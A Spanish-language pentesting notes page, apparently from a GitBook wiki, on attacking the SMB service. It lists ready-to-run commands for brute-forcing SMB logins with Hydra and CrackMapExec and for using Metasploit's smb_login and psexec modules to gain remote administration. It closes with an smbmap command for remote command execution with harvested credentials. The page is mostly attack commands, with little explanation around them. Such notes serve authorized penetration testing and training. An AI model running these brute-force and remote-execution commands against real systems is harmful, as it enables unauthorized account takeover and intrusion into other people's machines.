# SMB

## Fuerza Bruta

### Hydra

Para poder hacer fuerza bruta con hydra al servicio SMB, se pueden dar varios casos, en el caso de que tengas el usuario pero no la contraseña, deberás de usar un diccionario en este aspecto, por lo que el comando sería el siguiente:

```bash
hydra -l user -P passwords.txt smb://127.0.0.1 -t 15
```

En este caso con el parámetro `-l` le indicamos que sabemos el usuario y con el parámetro `-P` le indicamos la ruta donde esta el diccionario de contraseñas.

{% hint style="warning" %}
Puede que el servicio SMB no se encuentre en el puerto predefinido, en ese caso deberemos de especificar a hydra el puerto en el que está, esto se hace con el parámetro `-s`

```
hydra -l user -P passwords.txt SMB://127.0.0.1 -t 15 -s 2000
```
{% endhint %}

En el caso contrario de que no sepas el usuario pero si la contraseña, los parámetros querían así:

```bash
hydra -L users.txt -p Password123 smb://127.0.0.1 -t 15
```

En este comando, le indicamos la ruta del diccionario de usuarios con el parámetro en mayúscula y una contraseña en concreto con el parámetro en minúscula. En el otro posible caso de que no tengamos ni la contraseña ni el usuario, pondremos los dos parámetros en mayúscula pasándole como valor la ruta del diccionario tanto de usuarios como de contraseñas.

```bash
hydra -L users.txt -P passwords.txt smb://127.0.0.1 -t 15
```

### Crackmapexec

Podemos usar esta herramienta para probar una serie de contraseñas en base a un usuario o viceversa sustituyendo la contraseña por la ruta de un diccionario. Por ejemplo:

```ruby
crackmapexec smb 192.168.1.10 -u usuario -p diccionario.txt
```

{% hint style="warning" %}
**ATENCIÓN!!** Puede que los resultados no sean reales y nos den falsos negativos, por lo que se recomienda revisar los resultados con smbmap (`smbmap -H 192.168.1.10 -u usuario -p contraseña1`)
{% endhint %}

### Metasploit

#### Fuerza Bruta

Podemos usar metasploit para hacer fuerza bruta para SMB, el modulo es "`auxiliary/scanner/smb/smb_login`"

* SMBUSser -> En el caso de que usemos un usuario concreto
* USER\_FILE -> En el caso de que usemos un diccionario de usuarios
* PASS\_FILE -> En el caso de que usemos un diccionario de contraseñas
* SMBPass -> En el caso de que usemos una contraseña concreta
* RHOSTS -> IP de la máquina victima
* VERBOSE -> Desactivar

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

#### PSexec

Existe otro módulo llamado psexec (`exploit/windows/smb/psexec`) cuyo objetivo es adquirir administración remota de la maquina

* RHOSTS -> IP de la máquina victima
* SMBUSser -> En el caso de que usemos un usuario concreto
* SMBPass -> En el caso de que usemos una contraseña concreta

## RCE

Podemos ejecutar comandos con un usuario y contraseña de SMB usando [SmbMap](../../reconocimiento/protocolos-servicios/smb.md#smbmap) y el siguiente comando:

```bash
smbmap -u usuario -p password -H 192.168.1.1 -x 'comando'
```
